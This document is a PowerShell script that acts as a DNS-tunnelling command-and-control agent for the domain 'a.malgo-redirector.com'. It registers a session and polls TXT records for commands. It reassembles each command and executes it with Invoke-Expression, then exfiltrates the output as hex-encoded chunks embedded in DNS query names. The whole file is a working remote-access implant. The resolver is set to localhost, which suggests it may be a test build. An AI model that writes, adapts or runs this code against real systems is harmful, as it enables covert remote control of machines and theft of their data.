$dnsAddr = "127.0.0.1"

$domain = "a.malgo-redirector.com"

$chunkLength = 80 - $domain.Length
if ($chunkLength % 2 -ne 0) {
    $chunkLength -= 1
}

$sessionId = "d8524193-809d-4f36-b65c-9a48ead7258e"
$projectId = "a6705419-34b2-427a-b515-f193cb079607"

filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
filter chunks($c) { $t = $_; 0..[math]::floor($t.length / $c) | % { $t.substring($c * $_, [math]::min($c, $t.length - $c * $_)) } } 
filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim('.') } 

function Get-Blob {
    return -join ((65..90) + (97..122) | Get-Random -Count 4 | % { [char]$_ })
}

function Register-Session {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $sessionID,
        [Parameter()]
        [String]
        $projectID
    )
    $random = Get-Blob

    $queryString = "$projectID.$sessionID.$random.$domain"

    Resolve-DnsName -Name $queryString -Server $dnsAddr -Type AAAA
}

function Get-CommandInfo {
    $random = Get-Blob

    return (Resolve-DnsName -Name "$sessionId.$random.$domain" -Server $dnsAddr -Type TXT).Strings
}

function Get-CommandDetails {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandID
    )
    $random = Get-Blob


    $currentOffset = 0
    $isFinished = $false
    $command = ""

    while (-not $isFinished) {
        [string]$stringOffset = $currentOffset 
        $queryString = "a.$stringOffset.$commandID.$random.$domain"
        $response = (Resolve-DnsName -Name $queryString -Server $dnsAddr -Type TXT).Strings
        $response = $response | ConvertFrom-Json

        Write-Host "Response: $response"

        $data = $response.data
        $isFinished = $response.is_last_chunk
        Write-Host "Is Finished: $isFinished"
        $currentOffset += $data.Length
        Write-Host "Current Offset: $currentOffset"
        $command += $data
    }

    return $command
}

function Exfiltrate-Data {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandId,
        [Parameter()]
        [String]
        $data
    )

    $dataToSend = $data | Out-String

    $random = Get-Blob
    $result_length = $dataToSend.Length

    # send the length of the data
    $queryString = "a.$result_length.$commandId.$random.$domain"

    Resolve-DnsName -Name $queryString -Server $dnsAddr -Type A

    $offset = 0

    $dataToSend | thx | chunks $chunkLength | dots | % {
        $chunk = $_
        [string]$stringOffset = $offset
        $queryString = "a.$chunk.$stringOffset.$commandId.$random.$domain"
        Resolve-DnsName -Name $queryString -Server $dnsAddr -Type A | Out-Null
        Write-Host "Sent chunk: $chunk"
        Write-Host "Offset: $offset"
        Write-Host "--------------------------------"
        $offset += $chunkLength/2
    }

}

Register-Session -sessionID $sessionId -projectID $projectId
while($true) {
    $cmd = Get-CommandInfo
    if ($cmd -eq "null") {
        Write-Host "No command found"
    }
    else {
        $cmdInfo = $cmd | ConvertFrom-Json

        $command = Get-CommandDetails -commandID $cmdInfo.command_id
        Write-Host "Command: $command"

        $response = Invoke-Expression $command | Out-String
        Write-Host "Response: $response"

        Exfiltrate-Data -commandId $cmdInfo.command_id -data $response
    }

    Start-Sleep -Seconds 5
}